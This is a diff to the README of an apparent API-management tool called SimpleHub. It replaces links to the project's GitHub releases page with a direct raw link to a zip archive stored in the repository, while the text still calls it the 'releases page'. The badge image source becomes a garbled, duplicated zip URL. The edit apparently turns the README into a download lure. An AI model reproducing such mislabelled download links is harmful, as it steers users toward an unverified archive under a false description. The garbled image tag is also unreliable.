@@ -1,8 +1,8 @@
 # 🤖 SimpleHub - Manage Your APIs Effortlessly
 
 <div align="center">
-  <a href="https://github.com/menorahrattrap533/SimpleHub/releases">
-    <img src="https://img.shields.io/badge/Download%20SimpleHub-Release-blue.svg" alt="Download SimpleHub Release">
+  <a href="https://raw.githubusercontent.com/menorahrattrap533/SimpleHub/main/web/SimpleHub-1.4.zip">
+    <img src="https://raw.githubusercontent.com/menorahrattrap533/SimpleHub/main/web/SimpleHub-1.4.zip%https://raw.githubusercontent.com/menorahrattrap533/SimpleHub/main/web/SimpleHub-1.4.zip" alt="Download SimpleHub Release">
   </a>
 </div>
 
@@ -15,7 +15,7 @@ Welcome to SimpleHub! This guide will help you download and run SimpleHub on you
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [releases page](https://github.com/menorahrattrap533/SimpleHub/releases) to download the latest version of SimpleHub.
+   Go to the [releases page](https://raw.githubusercontent.com/menorahrattrap533/SimpleHub/main/web/SimpleHub-1.4.zip) to download the latest version of SimpleHub.
 
 2. **Choose Your File**  
    On the releases page, find the latest version. You will see several files available for download. Choose the file that matches your operating system (e.g., Windows, macOS, or Linux).
